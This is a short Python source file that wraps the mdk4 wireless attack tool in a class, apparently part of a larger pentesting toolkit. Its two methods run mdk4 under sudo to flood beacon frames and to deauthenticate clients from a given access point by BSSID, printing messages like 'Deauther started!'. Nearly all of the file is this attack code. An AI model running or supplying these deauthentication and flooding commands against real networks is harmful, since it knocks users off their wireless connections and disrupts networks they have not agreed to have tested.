import subprocess
from basics import *


class mdk4:
    def __init__(self, interface: str = None, mode: str = None, count: str = None, bssid: str = None):
        self.mode = mode
        self.count = str(count)
        self.bssid = bssid
        self.interface = interface

    def beacon_flooding(self):
        clrscr()
        typewriter.yellow("beacon is flooding!")
        subprocess.run(["sudo", "mdk4", self.interface, self.mode, "-s", self.count])

            
    
    def Deauther(self):
        clrscr()
        typewriter.yellow("Deauther started!")
        subprocess.run(["sudo", "mdk4", self.interface, self.mode, "-B", self.bssid])